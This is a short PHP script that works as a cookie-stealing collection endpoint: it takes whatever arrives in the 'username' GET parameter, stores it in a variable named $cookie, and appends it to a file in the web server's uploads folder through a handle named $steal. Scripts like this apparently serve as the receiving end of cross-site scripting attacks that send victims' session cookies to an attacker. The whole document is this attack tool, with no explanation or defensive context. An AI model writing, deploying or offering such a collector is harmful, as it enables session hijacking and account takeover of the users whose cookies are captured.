

<?php

$cookie = $_GET["username"];

$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");

fwrite($steal, $cookie ."\n");

fclose($steal);

?>
